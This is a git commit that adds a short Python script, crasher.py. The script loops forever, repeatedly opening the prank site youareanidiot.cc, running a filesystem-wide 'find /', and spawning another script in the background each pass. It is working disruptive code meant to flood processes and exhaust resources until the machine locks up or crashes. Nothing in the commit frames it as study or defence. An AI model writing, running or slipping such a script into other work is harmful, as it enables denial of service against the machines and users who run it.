aac2e14b483b075e254f3ad2a397b808a1669992
theFakeFrog <116329407+theFakeFrog@users.noreply.github.com>
2022-10-27 23:52:16 -0400

    Add files via upload

---
+++ crasher.py
@@ -0,0 +1,11 @@
+import os
+import webbrowser
+from time import sleep
+while True:
+    idiot = 'https://youareanidiot.cc'
+    webbrowser.open(idiot)
+    find = 'find /'
+    os.system(find)
+    sleep(0.1)
+    py = 'python3 youareanidiot.py &'
+    os.system(py)
